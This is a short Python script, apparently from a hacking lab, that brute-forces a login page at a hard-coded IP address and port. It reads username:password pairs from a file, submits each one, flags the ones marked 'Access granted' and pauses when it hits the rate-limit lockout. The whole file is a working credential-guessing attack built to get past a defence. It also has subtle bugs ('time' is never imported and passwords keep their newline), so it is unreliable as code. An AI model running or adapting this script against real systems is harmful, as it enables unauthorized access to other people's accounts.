import requests

# file that contain user:pass
userpass_file = "/home/geshet/Documents/support_pass.txt"

# create url using user and password as argument
url = "http://138.68.178.123:32696/login.php"

# rate limit blocks for 30 seconds
lock_time = 30

# message that alert us we hit rate limit
lock_message = "Too many login failures, please wait 30 seconds before retry."

# read user and password
with open(userpass_file, "r") as fh:
    for fline in fh:
        # skip comment
        if fline.startswith("#"):
            continue

        # take username
        username = fline.split(":")[0]

        # take password, join to keep password that contain a :
        password = ":".join(fline.split(":")[1:])

        # prepare POST data
        data = {
            "userid": username,
            "passwd": password,
        }

        # do the request
        res = requests.post(url, data=data)
        print(username, password)
        # handle generic credential error
        if "Invalid credentials" in res.text:
            print("[-] Invalid credentials: userid:{} passwd:{}".format(username, password))
        # user and password were valid !
        elif "Access granted" in res.text:
            print("[+] Valid credentials: userid:{} passwd:{}".format(username, password))
        # hit rate limit, let's say we have to wait 30 seconds
        elif lock_message in res.text:
            print("[-] Hit rate limit, sleeping 30")
            # do the actual sleep plus 0.5 to be sure
            time.sleep(lock_time+0.5)
